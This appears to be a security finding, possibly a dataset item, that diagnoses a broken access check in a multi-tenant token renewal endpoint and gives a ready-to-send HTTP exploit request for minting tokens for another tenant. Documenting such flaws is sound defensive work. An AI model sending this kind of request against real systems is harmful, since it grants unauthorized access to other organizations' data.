diagnosis: The multi-tenant session renewal handler accepts a valid refreshToken and issues a tenant-scoped access token for targetTenantId without verifying whether payload.userId has an active membership or role in targetTenantId. Any authenticated user can issue valid tokens for any tenant organization in the platform.
exploit_request:
POST /api/auth/renew-tenant-token HTTP/1.1
Host: sso.multitenant-saas.com
Content-Type: application/json

{"refreshToken": "<valid_user_refresh_token>", "targetTenantId": "tenant_enterprise_defense_corp"}
